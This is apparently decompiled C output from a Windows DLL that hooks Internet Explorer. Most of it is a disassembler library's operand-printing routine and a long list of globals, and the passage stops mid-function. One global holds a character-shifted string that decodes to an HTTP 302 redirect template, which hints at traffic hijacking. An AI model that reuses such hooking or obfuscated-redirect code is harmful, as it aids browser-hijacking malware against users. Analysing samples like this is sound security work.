char * g65; // 0x10055218
char * g66; // 0x10055318
char * g67; // 0x10055418
char * g68[12] = {
    "es",
    "cs",
    "ss",
    "ds",
    "fs",
    "gs",
    "flags",
    "eflags",
    "rflags",
    "ip+ilen",
    "eip+ilen",
    "rip+ilen"
}; // 0x10055528
char * g69[6] = {
    "flags",
    "eflags",
    "rflags",
    "ip+ilen",
    "eip+ilen",
    "rip+ilen"
}; // 0x10055540
char * g70[8] = {
    "st(0)",
    "st(1)",
    "st(2)",
    "st(3)",
    "st(4)",
    "st(5)",
    "st(6)",
    "st(7)"
}; // 0x10055628
char * g71[7] = {
    "st(1)",
    "st(2)",
    "st(3)",
    "st(4)",
    "st(5)",
    "st(6)",
    "st(7)"
}; // 0x1005562c
int32_t g72 = 0; // 0x100558a8
int32_t g74 = 0; // 0x10055d58
int32_t g75 = 0; // 0x10055d60
char * g76 = "IUUQ02/2!413!Npwfe\x0e\xbdpoufou.Mfohui;!1\x0e\vMpdbujpo;!&t\x0e\v\x0e\v"; // 0x10055e44
int32_t g78 = -0x44bf19b2; // 0x100561b0
int32_t g79 = -1; // 0x10056c64
char * g80; // 0x10056d70
struct _RTL_CRITICAL_SECTION * g81 = NULL; // 0x10056e70
int32_t g82 = 0; // 0x10056e88
int32_t g83 = 0; // 0x10056f88
int32_t g84 = 0; // 0x10056f8c
int32_t g85 = 0; // 0x10056f90
int32_t g86 = 0; // 0x10056f94
int32_t g87 = 0; // 0x10056f98
int32_t g88 = 0; // 0x10056f9c
int32_t g89 = 0; // 0x10056fa0
int32_t g90 = 0; // 0x10056fa4
int32_t g91 = 0; // 0x10056fa8
int32_t g92 = 0; // 0x10056fac
char g93 = 0; // 0x10056fb0
int32_t g94 = 0; // 0x10056fb4
int32_t g95 = 0; // 0x10056fb8
int32_t g96 = 0; // 0x10056fbc
int32_t g97 = 0; // 0x10056fc0
int32_t g98 = 0; // 0x10056fc4
int32_t g99 = 0; // 0x10056fc8
char g100 = 0; // 0x10056fcc
int32_t g101 = 0; // 0x10056fd0
int16_t * g102 = NULL; // 0x10056fd4
int32_t g103 = 0; // 0x10056fd8
int32_t g104 = 0; // 0x10056fdc
int32_t g105 = 0; // 0x10056fe0
int32_t g106 = 0; // 0x10056fe4
int32_t g107 = 0; // 0x10056fe8
int32_t g108 = 0; // 0x10056fec
char g109 = 0; // 0x10056ff0
int32_t g110 = 0; // 0x10056ff6
int16_t * g111 = NULL; // 0x10056ff8
int16_t * g112 = NULL; // 0x10057200
int32_t g113 = 0; // 0x10057408
int32_t g114 = 0; // 0x1005760e
int16_t * g115 = NULL; // 0x10057610
int32_t g116 = 0; // 0x10057818
int32_t g117 = 0; // 0x10057820
int32_t g118 = 0; // 0x10057828
int32_t g119 = 0; // 0x1005782c
int32_t g120 = 0; // 0x10057830
int32_t g121 = 0; // 0x10057834
int32_t g122 = 0; // 0x1005783c
int32_t g123 = 0; // 0x10057840
int32_t g124 = 0; // 0x10057858
int32_t g125 = 0; // 0x10057860
int32_t g126 = 0; // 0x10057868
int16_t g127 = 0; // 0x1005786c
int32_t g128 = 0; // 0x10057870
int32_t g129 = 0; // 0x10057878
int32_t g130 = 0; // 0x1005787c
int32_t g131 = 0; // 0x10057880
int32_t g132 = 0; // 0x10057888
int32_t g133 = 0; // 0x1005788c
int16_t * g134 = NULL; // 0x10057890
int32_t g135 = 0; // 0x10057a90
int32_t g136 = 0; // 0x10057af0
int32_t g137 = 0; // 0x10058308
int32_t g138 = 0; // 0x1005863c
int32_t g139 = 0; // 0x10058640
int32_t g140 = 0; // 0x10058750
int32_t g141 = 0; // 0x1005879c
int32_t g142 = 0; // 0x100587d0
int32_t g143 = 0; // 0x100587d8
int32_t g144 = 0; // 0x100587dc
int32_t g145 = 0; // 0x100587f8
int32_t g146 = 0; // 0x10058920
int32_t g147 = 0; // 0x10058940
int32_t g148;
int32_t g149;
int32_t g150;
int32_t g151;
int32_t g152;
int32_t g153;
int32_t g154;
int32_t g155;
int32_t g156;
int32_t g157;
int32_t g158;
int16_t g159;
int32_t g160;
int32_t g161;
int32_t g162;
int32_t g163;
int32_t g164;
int32_t g165;
int32_t g166;
int32_t g167;
int32_t g168;
int32_t g169;
int16_t g170;
int32_t g171;
int32_t g172;
int32_t g173;
int32_t g174;
int32_t g175;
int16_t g176;
int32_t g177;
int32_t g178;
int32_t g179;
struct vtable_1002a654_type g11 = {
    .e0 = function_10011970,
    .e1 = function_10011980,
    .e2 = function_10011990,
    .e3 = function_10012800,
    .e4 = function_10011770,
    .e5 = function_100119a0
}; // 0x1002a654
struct vtable_1002a6fc_type g14 = {
    .e0 = function_10012360,
    .e1 = function_100120c0,
    .e2 = function_100120d0,
    .e3 = function_100120a0,
    .e4 = function_10013bc0,
    .e5 = function_10013c20,
    .e6 = function_10013c50,
    .e7 = function_10012380
}; // 0x1002a6fc
int32_t * g15 = &g16; // 0x1002a71c
struct vtable_1002a7a0_type g18 = {
    .e0 = function_100125d0,
    .e1 = function_100125c0,
    .e2 = function_100125b0,
    .e3 = function_10011490,
    .e4 = function_10011460,
    .e5 = function_10011470
}; // 0x1002a7a0
struct vtable_1002a7ec_type g20 = {
    .e0 = function_100136c0,
    .e1 = function_10013640,
    .e2 = function_10013670,
    .e3 = function_10011d60,
    .e4 = function_10011dc0,
    .e5 = function_100136e0
}; // 0x1002a7ec
int32_t * g21 = &g22; // 0x1002a804
struct vtable_1002a830_type g23 = {
    .e0 = function_10013850,
    .e1 = function_10013810,
    .e2 = function_10013820,
    .e3 = function_100138c0
}; // 0x1002a830
struct vtable_1002ae3c_type g25 = {
    .e0 = function_10015880,
    .e1 = function_100157d0,
    .e2 = function_100157e0,
    .e3 = function_100157f0,
    .e4 = function_10015800,
    .e5 = function_10015860
}; // 0x1002ae3c
struct vtable_1002b918_type g38 = {
    .e0 = _3f__3f__Gbad_alloc_40_std_40__40_UAEPAXI_40_Z,
    .e1 = function_10021258
}; // 0x1002b918
struct vtable_1002c800_type g40 = {
    .e0 = _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z,
    .e1 = function_10021258
}; // 0x1002c800
int32_t * g50 = &g48; // 0x100386a0
int32_t * g73 = &g5; // 0x10055938
int32_t ** g43 = &g73; // 0x1002eca8
int32_t * g77 = &g147; // 0x10055f30

// ------------------------ Functions -------------------------

// Address range: 0x10001000 - 0x10001018
int32_t function_10001000(int32_t a1, int32_t result) {
    // 0x10001000
    g179 = a1 & 255;
    return result;
}

// Address range: 0x10001030 - 0x10001048
int32_t function_10001030(int32_t a1) {
    // 0x10001030
    return (int32_t)_memset((int32_t *)a1, 0, 960);
}

// Address range: 0x10001050 - 0x1000114d
int32_t function_10001050(int32_t a1, uint32_t a2, int32_t a3, uint32_t a4, int32_t a5) {
    // 0x10001050
    if (*(int32_t *)a1 != 0x1234566f) {
        // 0x1000105f
        __wassert();
        return 0;
    }
    if (a4 == 0) {
        // 0x10001080
        __wassert();
    }
    int32_t result = a1 + 16; // 0x1000109a
    int32_t * v1 = (int32_t *)result; // 0x100010a0
    _memset(v1, 0, 928);
    *v1 = 0x1234567f;
    *(int32_t *)(a1 + 20) = a1;
    _memset((int32_t *)(a1 + 24), 32, 255);
    *(char *)(a1 + 279) = 0;
    *(int32_t *)(a1 + 288) = a2 - a4;
    int32_t * v2 = (int32_t *)(a1 + 304); // 0x100010df
    *v2 = a4;
    *(int32_t *)(a1 + 292) = a4 / 0x80000000 + a3 + (int32_t)(a2 < a4);
    if (*(int32_t *)(*(int32_t *)(a1 + 8) + 8) != 0) {
        // 0x10001146
        return result;
    }
    // 0x100010f9
    if (*v2 != a4) {
        // 0x10001101
        __wassert();
    }
    // 0x10001115
    if (*(int32_t *)(a1 + 312) >= 25) {
        // 0x1000111e
        __wassert();
    }
    char * v3 = (char *)(a1 + 932); // 0x10001132
    *v3 = *v3 | 8;
    *v2 = a4;
    return 0;
}

// Address range: 0x10001150 - 0x100011cb
int32_t function_10001150(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = (int32_t)a1;
    _memset(a1, 0, 960);
    *a1 = 0x1234566f;
    int32_t v2 = g45; // 0x10001179
    if (g45 == 0) {
        // 0x1000118e
        __wassert();
        __wassert();
        return 0;
    }
    int32_t v3 = &g45;
    while (v2 != a2) {
        int32_t v4 = v3 + 8; // 0x10001184
        v2 = *(int32_t *)v4;
        if (v2 == 0) {
            // 0x1000118e
            __wassert();
            __wassert();
            return 0;
        }
        v3 = v4;
    }
    // 0x100011b8
    *(int32_t *)(v1 + 4) = *(int32_t *)v3;
    *(int32_t *)(v1 + 8) = *(int32_t *)(v3 + 4);
    return 1;
}

// Address range: 0x100011d0 - 0x10001259
int32_t function_100011d0(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 680);
    _memset(v1, 0, 112);
    switch (*(int32_t *)(*(int32_t *)(a1 + 4) + 4)) {
        case 1: {
            // 0x10001243
            *v1 = a1;
            *(char *)(a1 + 776) = 68;
            *(int32_t *)(a1 + 752) = 3;
            return 1;
        }
        case 2: {
            // 0x1000122d
            *v1 = a1;
            *(char *)(a1 + 776) = 34;
            *(int32_t *)(a1 + 752) = 3;
            return 1;
        }
        case 3: {
            // 0x10001217
            *v1 = a1;
            *(char *)(a1 + 776) = -124;
            *(int32_t *)(a1 + 752) = 3;
            return 1;
        }
    }
    // 0x100011fa
    __wassert();
    return 0;
}

// Address range: 0x10001260 - 0x10001c80
int32_t function_10001260(int32_t a1, int32_t a2, int32_t a3) {
    char * v1 = (char *)(a1 + 777); // 0x10001269
    char * v2; // bp-24, 0x10001260
    char * v3; // bp-28, 0x10001260
    if ((*v1 & 2) != 0) {
        // 0x1000127a
        v2 = (char *)759;
        v3 = (char *)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        __wassert();
    }
    uint32_t v4 = (int32_t)*(char *)(a1 + 775); // 0x10001291
    if ((v4 & 3) != a3 && (v4 / 4 & 3) != a3) {
        // 0x100012ae
        v2 = (char *)760;
        v3 = (char *)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        __wassert();
    }
    uint16_t v5 = *(int16_t *)(a2 + 6); // 0x100012c8
    uint32_t v6 = (int32_t)v5; // 0x100012c8
    if (v5 < 17) {
        if (v5 < 2) {
            goto lab_0x100012db;
        } else {
            if ((v6 & 1) != 0) {
                goto lab_0x10001314;
            } else {
                goto lab_0x100012db;
            }
        }
    } else {
        goto lab_0x10001314;
    }
  lab_0x10001314:;
    char * v7 = (char *)(a1 + 264);
    unsigned char v8 = *v7; // 0x10001314
    int32_t v9 = v8; // 0x10001314
    char * v10 = (char *)v6; // 0x1000132d
    v2 = v10;
    v3 = "%d_byte ptr ";
    char * v11 = v7; // 0x1000132e
    char * v12 = v10; // 0x1000132e
    char * v13 = "%d_byte ptr "; // 0x1000132e
    int32_t v14 = v8 == -1 ? 0 : 256 - v9; // 0x1000132e
    int32_t v15 = v9; // 0x1000132e
    goto lab_0x10001333;
  lab_0x100012db:;
    char * v150 = (char *)(a1 + 264);
    unsigned char v151 = *v150; // 0x100012db
    int32_t v152 = v151; // 0x100012db
    if (v151 == -1) {
        int32_t v153 = *(int32_t *)(4 * v6 / 2 + (int32_t)&g47); // 0x10001305
        char * v154 = (char *)v153; // 0x1000130c
        v2 = v154;
        v3 = "%s ";
        v11 = v150;
        v12 = v154;
        v13 = "%s ";
        v14 = 0;
        v15 = v152;
    } else {
        int32_t v155 = *(int32_t *)(4 * v6 / 2 + (int32_t)&g47); // 0x100012f2
        char * v156 = (char *)v155; // 0x100012f9
        v2 = v156;
        v3 = "%s ";
        v11 = v150;
        v12 = v156;
        v13 = "%s ";
        v14 = 256 - v152;
        v15 = v152;
    }
    goto lab_0x10001333;
  lab_0x10001333:;
    char * v16 = v11;
    int32_t v17 = a1 + 8;
    int32_t v18 = __snprintf((char *)(v15 + v17), v14, v13, (int32_t)v12); // 0x1000133c
    unsigned char v19 = *v16 + (char)v18; // 0x10001341
    *v16 = v19;
    int32_t v20 = v19; // 0x10001347
    int32_t v21 = *(int32_t *)(a1 + 752); // 0x10001363
    char * v22 = (char *)*(int32_t *)(4 * v21 + (int32_t)&g46); // 0x10001370
    v2 = v22;
    v3 = "%s:";
    int32_t v23 = __snprintf((char *)(v17 + v20), v19 == -1 ? 0 : 256 - v20, "%s:", v22); // 0x1000137f
    char v24 = *v16 + (char)v23; // 0x10001384
    *v16 = v24;
    char * v25 = (char *)(a1 + 774); // 0x1000138a
    unsigned char v26 = *v25; // 0x1000138a
    int32_t v27 = v26; // 0x1000138a
    int32_t v28 = v24; // 0x10001390
    int32_t v29; // bp-20, 0x10001260
    int32_t v30 = &v29; // 0x10001396
    char * v31; // 0x10001260
    char * v32; // 0x10001260
    char v33; // 0x10001260
    char * v34; // 0x10001260
    char v35; // 0x10001260
    int32_t v36; // 0x10001260
    int32_t v37; // 0x10001260
    int32_t v38; // 0x10001260
    int32_t v39; // 0x10001260
    int32_t v40; // 0x10001260
    int32_t v41; // 0x10001260
    int32_t v42; // 0x10001260
    int32_t v43; // 0x10001260
    int32_t v44; // 0x10001260
    char * v45; // 0x100018d7
    int32_t v46; // 0x100013a2
    int32_t * v47; // 0x100013a2
    int32_t * v48; // 0x100013a8
    int32_t v49; // 0x10001839
    int32_t * v50; // 0x10001839
    int32_t * v51; // 0x1000183f
    if ((v26 & 16) == 0) {
        if ((v27 & 32) == 0) {
            // 0x10001b7d
            *(char *)(v17 + v28) = 91;
            unsigned char v52 = *v16 + 1; // 0x10001b85
            *v16 = v52;
            unsigned char v53 = *(char *)(a1 + 776); // 0x10001b8b
            int32_t v54 = v52; // 0x10001b92
            if ((v53 & -16) == 32) {
                // 0x10001c30
                v2 = (char *)(int32_t)*(int16_t *)(a1 + 784);
                v3 = "0x%04X";
                v36 = v52 == -1 ? 0 : 256 - v54;
                v38 = v54;
                v41 = (int32_t)&v3;
                goto lab_0x10001c50;
            } else {
                switch ((int32_t)(v53 / 16)) {
                    case 4: {
                        if (v52 == -1) {
                            int32_t v55 = *(int32_t *)(a1 + 784); // 0x10001c20
                            v2 = (char *)v55;
                            v3 = "0x%04lX";
                            v36 = 0;
                            v38 = v54;
                            v41 = (int32_t)&v3;
                        } else {
                            // 0x10001c08
                            v2 = (char *)*(int32_t *)(a1 + 784);
                            v3 = "0x%04lX";
                            v36 = 256 - v54;
                            v38 = v54;
                            v41 = (int32_t)&v3;
                        }
                        goto lab_0x10001c50;
                    }
                    case 8: {
                        int32_t v56 = v52 == -1 ? 0 : 256 - v54;
                        v2 = (char *)*(int32_t *)(a1 + 788);
                        int32_t v57 = *(int32_t *)(a1 + 784); // 0x10001be4
                        v3 = (char *)v57;
                        v37 = __snprintf((char *)(v17 + v54), v56, "0x%04I64X", (int64_t)v57);
                        goto lab_0x10001c61;
                    }
                    default: {
                        // 0x10001bae
                        v2 = (char *)808;
                        v44 = (int32_t)&v2;
                        goto lab_0x10001bb3;
                    }
                }
            }
        } else {
            // 0x10001839
            v49 = a1 + 784;
            v50 = (int32_t *)v49;
            int32_t v58 = *v50; // 0x10001839
            v51 = (int32_t *)(a1 + 788);
            int32_t v59 = *v51; // 0x1000183f
            v35 = v24;
            v43 = 0;
            if ((v59 || v58) == 0) {
                goto lab_0x1000192e;
            } else {
                // 0x1000184f
                v35 = v24;
                v43 = 1;
                if ((v27 & 64) == 0) {
                    goto lab_0x1000192e;
                } else {
                    // 0x10001858
                    unsigned char v60; // 0x10001858
                    switch (v60 / 16) {
                        case 2: {
                            char * v61 = (char *)(int32_t)*(int16_t *)v49; // 0x10001908
                            v2 = v61;
                            v3 = "0x%04X";
                            v45 = v61;
                            v34 = "0x%04X";
                            v40 = v24 == -1 ? 0 : 256 - v28;
                            goto lab_0x1000190e;
                        }
                        case 4: {
                            if (v24 == -1) {
                                char * v62 = (char *)v58; // 0x100018e5
                                v2 = v62;
                                v3 = "0x%04lX";
                                v34 = "0x%04lX";
                                v40 = 0;
                            } else {
                                // 0x100018c7
                                v45 = (char *)v58;
                                v2 = v45;
                                v3 = "0x%04lX";
                                v34 = "0x%04lX";
                                v40 = 256 - v28;
                            }
                            goto lab_0x1000190e;
                        }
                        case 8: {
                            int32_t v63 = v24 == -1 ? 0 : 256 - v28;
                            v2 = (char *)v59;
                            v3 = (char *)v58;
                            int32_t v64 = __snprintf((char *)(v17 + v28), v63, "0x%04I64X", (int64_t)v58); // 0x100018b3
                            char v65 = *v16 + (char)v64; // 0x100018bb
                            *v16 = v65;
                            v35 = v65;
                            v43 = 0;
                            goto lab_0x1000192e;
                        }
                        default: {
                            // 0x10001875
                            v2 = (char *)797;
                            v3 = (char *)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            __wassert();
                            v35 = *v16;
                            v43 = 0;
                            goto lab_0x1000192e;
                        }
                    }
                }
            }
        }
    } else {
        // 0x100013a2
        v46 = a1 + 784;
        v47 = (int32_t *)v46;
        int32_t v66 = *v47; // 0x100013a2
        v48 = (int32_t *)(a1 + 788);
        int32_t v67 = *v48; // 0x100013a8
        v33 = v24;
        v42 = 0;
        if ((v67 || v66) == 0) {
            goto lab_0x10001497;
        } else {
            // 0x100013b8
            v33 = v24;
            v42 = 1;
            if ((v27 & 64) == 0) {
                goto lab_0x10001497;
            } else {
                // 0x100013c1
                unsigned char v68; // 0x100013c1
                switch (v68 / 16) {
                    case 2: {
                        char * v69 = (char *)(int32_t)*(int16_t *)v46; // 0x10001471
                        v2 = v69;
                        v3 = "0x%04X";
                        v31 = v69;
                        v32 = "0x%04X";
                        v39 = v24 == -1 ? 0 : 256 - v28;
                        goto lab_0x10001477;
                    }
                    case 4: {
                        if (v24 == -1) {
                            char * v70 = (char *)v66; // 0x1000144e
                            v2 = v70;
                            v3 = "0x%04lX";
                            v31 = v70;
                            v32 = "0x%04lX";
                            v39 = 0;
                        } else {
                            char * v71 = (char *)v66; // 0x10001440
                            v2 = v71;
                            v3 = "0x%04lX";
                            v31 = v71;
                            v32 = "0x%04lX";
                            v39 = 256 - v28;
                        }
                        goto lab_0x10001477;
                    }
                    case 8: {
                        int32_t v72 = v24 == -1 ? 0 : 256 - v28;
                        v2 = (char *)v67;
                        v3 = (char *)v66;
                        int32_t v73 = __snprintf((char *)(v17 + v28), v72, "0x%04I64X", (int64_t)v66); // 0x1000141c
                        char v74 = *v16 + (char)v73; // 0x10001424
                        *v16 = v74;
                        v33 = v74;
                        v42 = 0;
                        goto lab_0x10001497;
                    }
                    default: {
                        // 0x100013de
                        v2 = (char *)774;
                        v3 = (char *)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        __wassert();
                        v33 = *v16;
                        v42 = 0;
                        goto lab_0x10001497;
                    }
                }
            }
        }
    }
  lab_0x10001497:;
    int32_t v75 = v33; // 0x10001497
    int32_t v76 = *(int32_t *)(a1 + 764); // 0x100014b0
    int32_t * v77 = (int32_t *)(v30 - 4);
    *v77 = *(int32_t *)(4 * v76 + (int32_t)&g68);
    int32_t * v78 = (int32_t *)(v30 - 8);
    *v78 = (int32_t)"[%s";
    int32_t * v79 = (int32_t *)(v30 - 12);
    *v79 = v33 == -1 ? 0 : 256 - v75;
    int32_t * v80 = (int32_t *)(v30 - 16);
    *v80 = v17 + v75;
    int32_t v81 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100014cc
    char v82 = *v16 + (char)v81; // 0x100014d1
    *v16 = v82;
    char v83 = v82; // 0x100014e7
    int32_t v84 = v81; // 0x100014e7
    if ((*v25 & 32) != 0) {
        int32_t v85 = v82; // 0x100014d7
        int32_t v86 = *(int32_t *)(a1 + 768); // 0x10001500
        *v77 = *(int32_t *)(4 * v86 + (int32_t)&g68);
        *v78 = (int32_t)"+%s";
        *v79 = v82 == -1 ? 0 : 256 - v85;
        *v80 = v17 + v85;
        int32_t v87 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000151c
        char v88 = *v16 + (char)v87; // 0x10001521
        *v16 = v88;
        unsigned char v89 = *(char *)(a1 + 772); // 0x10001527
        v83 = v88;
        v84 = v87;
        if (v89 >= 2) {
            int32_t v90 = v88; // 0x1000152d
            *v77 = (int32_t)v89;
            *v78 = (int32_t)"*%d";
            *v79 = v88 == -1 ? 0 : 256 - v90;
            *v80 = v17 + v90;
            int32_t v91 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10001560
            char v92 = *v16 + (char)v91; // 0x10001568
            *v16 = v92;
            v83 = v92;
            v84 = v91;
        }
    }
    char v93 = v83; // 0x10001572
    int32_t result = v84; // 0x10001572
    int32_t v94; // 0x10001260
    int32_t v95; // 0x10001260
    int32_t v96; // 0x10001260
    if (v42 == 0) {
        goto lab_0x10001751;
    } else {
        unsigned char v97 = *(char *)(a1 + 776); // 0x10001578
        if ((v97 & -16) == 32) {
            int32_t v98 = v83;
            if (*v48 < 0) {
                // 0x1000170e
                *v77 = (int32_t)-*(int16_t *)v46;
                *v78 = (int32_t)"-0x%02X";
                v94 = v83 == -1 ? 0 : 256 - v98;
                v96 = v98;
            } else {
                if (v83 == -1) {
                    // 0x100016fd
                    *v77 = (int32_t)*(int16_t *)v46;
                    *v78 = (int32_t)"+0x%02X";
                    v94 = 0;
                    v96 = v98;
                } else {
                    // 0x100016e4
                    *v77 = (int32_t)*(int16_t *)v46;
                    *v78 = (int32_t)"+0x%02X";
                    v94 = 256 - v98;
                    v96 = v98;
                }
            }
            goto lab_0x1000173a;
        } else {
            switch ((int32_t)(v97 / 16)) {
                case 4: {
                    int32_t v99 = v83;
                    if (*v48 < 0) {
                        if (v83 == -1) {
                            // 0x100016b3
                            *v77 = -*v47;
                            *v78 = (int32_t)"-0x%02lX";
                            v94 = 0;
                            v96 = v99;
                        } else {
                            // 0x10001696
                            *v77 = -*v47;
                            *v78 = (int32_t)"-0x%02lX";
                            v94 = 256 - v99;
                            v96 = v99;
                        }
                    } else {
                        if (v83 == -1) {
                            // 0x10001678
                            *v77 = *v47;
                            *v78 = (int32_t)"+0x%02lX";
                            v94 = 0;
                            v96 = v99;
                        } else {
                            // 0x1000165d
                            *v77 = *v47;
                            *v78 = (int32_t)"+0x%02lX";
                            v94 = 256 - v99;
                            v96 = v99;
                        }
                    }
                    goto lab_0x1000173a;
                }
                case 8: {
                    int32_t v100 = *v48; // 0x100015b5
                    int32_t v101 = *v47; // 0x100015bb
                    int32_t v102 = v83;
                    int32_t v103 = v83 == -1 ? 0 : 256 - v102;
                    if (v100 < 0) {
                        // 0x10001601
                        *v77 = -((v100 + (int32_t)(v101 != 0)));
                        *v78 = -v101;
                        *v79 = (int32_t)"-0x%02I64X";
                        *v80 = v103;
                        *(int32_t *)(v30 - 20) = v17 + v102;
                        v95 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                    } else {
                        // 0x100015c5
                        *v77 = v100;
                        *v78 = v101;
                        *v79 = (int32_t)"+0x%02I64X";
                        *v80 = v103;
                        *(int32_t *)(v30 - 20) = v17 + v102;
                        v95 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                    }
                    goto lab_0x1000174b;
                }
                default: {
                    // 0x10001599
                    *v77 = 783;
                    *v78 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v79 = (int32_t)&g3;
                    int32_t v104 = __wassert(); // 0x100015a8
                    v93 = *v16;
                    result = v104;
                    goto lab_0x10001751;
                }
            }
        }
    }
  lab_0x1000192e:;
    int32_t v105 = v35; // 0x1000192e
    int32_t v106 = *(int32_t *)(a1 + 768); // 0x10001947
    int32_t v107 = v30 - 4; // 0x10001954
    int32_t * v108 = (int32_t *)v107; // 0x10001954
    *v108 = *(int32_t *)(4 * v106 + (int32_t)&g68);
    int32_t v109 = v30 - 8; // 0x10001955
    int32_t * v110 = (int32_t *)v109; // 0x10001955
    *v110 = (int32_t)"[%s";
    int32_t * v111 = (int32_t *)(v30 - 12); // 0x1000195a
    *v111 = v35 == -1 ? 0 : 256 - v105;
    int32_t * v112 = (int32_t *)(v30 - 16); // 0x10001962
    *v112 = v17 + v105;
    int32_t v113 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10001963
    char v114 = *v16 + (char)v113; // 0x10001968
    *v16 = v114;
    unsigned char v115 = *(char *)(a1 + 772); // 0x1000196e
    char v116 = v114; // 0x10001980
    int32_t v117 = v113; // 0x10001980
    if (v115 >= 2) {
        int32_t v118 = v114; // 0x10001974
        *v108 = (int32_t)v115;
        *v110 = (int32_t)"*%d";
        *v111 = v114 == -1 ? 0 : 256 - v118;
        *v112 = v17 + v118;
        int32_t v119 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100019a7
        char v120 = *v16 + (char)v119; // 0x100019af
        *v16 = v120;
        v116 = v120;
        v117 = v119;
    }
    char v121 = v116; // 0x100019b9
    int32_t result3 = v117; // 0x100019b9
    if (v43 == 0) {
        goto lab_0x10001c67;
    } else {
        unsigned char v122 = *(char *)(a1 + 776); // 0x100019bf
        if ((v122 & -16) == 32) {
            int32_t v123 = v116;
            if (*v51 < 0) {
                // 0x10001b4c
                *v108 = (int32_t)-*(int16_t *)v49;
                *v110 = (int32_t)"-0x%02X";
                v36 = v116 == -1 ? 0 : 256 - v123;
                v38 = v123;
                v41 = v109;
            } else {
                if (v116 == -1) {
                    // 0x10001b38
                    *v108 = (int32_t)*(int16_t *)v49;
                    *v110 = (int32_t)"+0x%02X";
                    v36 = 0;
                    v38 = v123;
                    v41 = v109;
                } else {
                    // 0x10001b1c
                    *v108 = (int32_t)*(int16_t *)v49;
                    *v110 = (int32_t)"+0x%02X";
                    v36 = 256 - v123;
                    v38 = v123;
                    v41 = v109;
                }
            }
            goto lab_0x10001c50;
        } else {
            switch ((int32_t)(v122 / 16)) {
                case 4: {
                    int32_t v124 = *v51; // 0x10001a73
                    unsigned char v125; // 0x10001260
                    int32_t v126 = v125;
                    if (v124 < 0) {
                        if (v125 == -1) {
                            int32_t v127 = *v50; // 0x10001ae8
                            *v108 = -v127;
                            *v110 = (int32_t)"-0x%02lX";
                            v36 = 0;
                            v38 = v126;
                            v41 = v109;
                        } else {
                            int32_t v128 = *v50; // 0x10001ad5
                            *v108 = -v128;
                            *v110 = (int32_t)"-0x%02lX";
                            v36 = 256 - v126;
                            v38 = v126;
                            v41 = v109;
                        }
                    } else {
                        if (v125 == -1) {
                            int32_t v129 = *v50; // 0x10001aad
                            *v108 = v129;
                            *v110 = (int32_t)"+0x%02lX";
                            v36 = 0;
                            v38 = v126;
                            v41 = v109;
                        } else {
                            int32_t v130 = *v50; // 0x10001a9c
                            *v108 = v130;
                            *v110 = (int32_t)"+0x%02lX";
                            v36 = 256 - v126;
                            v38 = v126;
                            v41 = v109;
                        }
                    }
                    goto lab_0x10001c50;
                }
                case 8: {
                    int32_t v131 = *v51; // 0x100019ea
                    int32_t v132 = *v50; // 0x100019f0
                    int32_t v133 = v116;
                    int32_t v134 = v116 == -1 ? 0 : 256 - v133;
                    if (v131 < 0) {
                        // 0x10001a36
                        *v108 = -((v131 + (int32_t)(v132 != 0)));
                        *v110 = -v132;
                        *v111 = (int32_t)"-0x%02I64X";
                        *v112 = v134;
                        *(int32_t *)(v30 - 20) = v17 + v133;
                        v37 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                    } else {
                        // 0x100019fa
                        *v108 = v131;
                        *v110 = v132;
                        *v111 = (int32_t)"+0x%02I64X";
                        *v112 = v134;
                        *(int32_t *)(v30 - 20) = v17 + v133;
                        v37 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                    }
                    goto lab_0x10001c61;
                }
                default: {
                    // 0x100019e0
                    *v108 = 802;
                    v44 = v107;
                    goto lab_0x10001bb3;
                }
            }
        }
    }
  lab_0x10001751:
    // 0x10001751
    *(char *)(v17 + (int32_t)v93) = 93;
    *v16 = *v16 + 1;
    if ((*v1 & 1) == 0) {
        // 0x10001c79
        return result;
    }
    uint32_t v135 = *(int32_t *)(a2 + 8); // 0x10001773
    int32_t v136 = *(int32_t *)(a2 + 12); // 0x10001776
    if ((v136 || v135) == 0) {
        // 0x1000177f
        *v77 = 788;
        *v78 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v79 = (int32_t)L"Address";
        __wassert();
    }
    unsigned char v137 = *(char *)(a1 + 776) & 15;
    int32_t v138; // 0x10001260
    int32_t v139; // 0x10001260
    if (v137 == 2) {
        // 0x100017e2
        v138 = (int32_t)(*(char *)(a1 + 272) + (char)v135);
        v139 = 0;
    } else {
        switch ((int32_t)v137) {
            case 4: {
                // 0x100017d8
                v138 = *(int32_t *)(a1 + 272) + v135;
                v139 = 0;
                // break -> 0x100017f2
                break;
            }
            case 8: {
                int32_t v140 = *(int32_t *)(a1 + 272) + v135; // 0x100017ce
                v138 = v140;
                v139 = *(int32_t *)(a1 + 276) + v136 + (int32_t)(v140 < v135);
                // break -> 0x100017f2
                break;
            }
            default: {
                // 0x100017af
                *v77 = 789;
                *v78 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v79 = (int32_t)&g3;
                __wassert();
                v138 = v135;
                v139 = v136;
                // break -> 0x100017f2
                break;
            }
        }
    }
    unsigned char v141 = *v16; // 0x100017f2
    int32_t v142 = v141; // 0x100017f2
    *v77 = v139;
    *v78 = v138;
    *v79 = (int32_t)"=[0x%04I64X]";
    *v80 = v141 == -1 ? 0 : 256 - v142;
    *(int32_t *)(v30 - 20) = v17 + v142;
    int32_t result2 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000181b
    *v16 = *v16 + (char)result2;
    return result2;
  lab_0x10001c50:
    // 0x10001c50
    *(int32_t *)(v41 - 4) = v36;
